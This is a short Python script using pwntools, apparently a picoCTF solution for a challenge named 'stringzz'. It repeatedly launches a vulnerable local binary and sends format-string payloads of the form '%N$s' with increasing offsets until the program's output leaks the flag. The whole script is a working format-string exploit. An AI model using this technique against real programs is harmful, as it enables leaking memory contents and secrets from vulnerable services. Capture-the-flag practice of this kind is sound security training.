import os;os.environ['TMPDIR'] = os.path.join(os.environ['HOME'], 'tmp')
import pwn

remote_binary = "/problems/stringzz_2_a90e0d8339487632cecbad2e459c71c4/vuln"

def segfault():
   i = 0
   while True:
      try:
        payload = "%" + str(i) + "$s"
        print("[{}]".format(i))
        pr = pwn.process(remote_binary);
        pr.sendlineafter("input whatever string you want; then it will be printed back:\n", payload)
        rsp = pr.readall(timeout=0.5)
        if "pico" in rsp:
            print(rsp)
            break
        i += 1
      finally:
        pr.close()

segfault()
